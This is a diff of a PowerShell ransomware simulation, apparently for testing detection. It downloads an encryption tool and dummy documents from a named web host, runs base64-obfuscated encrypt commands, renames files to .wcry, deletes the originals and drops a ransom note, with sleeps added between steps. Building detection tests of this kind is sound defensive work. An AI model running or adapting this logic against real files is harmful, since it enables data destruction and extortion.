@@ -11,10 +11,10 @@ $dummyfiledest2 = "C:\Users\Public\Documents\prs-doc2.pdf"
 $dummyfiledest3 = "C:\Users\Public\Documents\prs-doc3.xlxs"
 $dummyfiledest4 = "C:\Users\Public\Documents\prs-doc4.pptx"
 #defines ransom note source/destination#
-$ransomnotesauce = "https://#define you own webserver here#/README.txt"
+$ransomnotesauce = "https://repo.it-va.com/prs/README.txt"
 $ransomnotedest = "C:\Users\Public\Documents\README.txt"
 #Define AEScrypt cli exe location#
-$cryptsauce = "https://#define you own webserver here#/aescrypt.exe"
+$cryptsauce = "https://repo.it-va.com/prs/aescrypt.exe"
 $cryptdest = "C:\Users\Public\Documents\aescrypt.exe"
 #Download the files#
 Invoke-WebRequest -Uri $dummyfilesauce1 -OutFile $dummyfiledest1
@@ -45,11 +45,14 @@ $cryptrunnerdec2 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::Fro
 $cryptrunnerdec3 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc3))
 $cryptrunnerdec4 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc4))
 #ready.fire.aim#
+#sleep between each of the encrypt/rename/del commands to give extra time for detection#
 Invoke-Expression -Command "$cryptrunnerdec1"
+Start-Sleep -Seconds 30
 Invoke-Expression -Command "$cryptrunnerdec2"
+Start-Sleep -Seconds 30
 Invoke-Expression -Command "$cryptrunnerdec3"
+Start-Sleep -Seconds 30
 Invoke-Expression -Command "$cryptrunnerdec4"
-#wait 10 seconds#
 #define encrypted files for renaming#
 $c1 = "C:\Users\Public\Documents\prs-doc1.docx.aes"
 $c2 = "C:\Users\Public\Documents\prs-doc2.pdf.aes"
@@ -62,15 +65,24 @@ $d3 = "C:\Users\Public\Documents\prs-doc3.xlxs.wcry"
 $d4 = "C:\Users\Public\Documents\prs-doc4.pptx.wcry"
 #rename encrypted files to increase detection chances#
 Rename-Item $c1 $d1
+Start-Sleep -Seconds 30
 Rename-Item $c2 $d2
+Start-Sleep -Seconds 30
 Rename-Item $c3 $d3
+Start-Sleep -Seconds 30
 Rename-Item $c4 $d4
-#drop note#
-Invoke-WebRequest -Uri $ransomnotesauce -OutFile $ransomnotedest
+Start-Sleep -Seconds 30
 #delete unencrypted files#
 Remove-Item "$dummyfiledest1"
+Start-Sleep -Seconds 30
 Remove-Item "$dummyfiledest2"
+Start-Sleep -Seconds 30
 Remove-Item "$dummyfiledest3"
+Start-Sleep -Seconds 30
 Remove-Item "$dummyfiledest4"
+Start-Sleep -Seconds 30
+#drop note#
+Invoke-WebRequest -Uri $ransomnotesauce -OutFile $ransomnotedest
+Start-Sleep -Seconds 30
 #delete aescrypt#
 Remove-Item "$cryptdest"
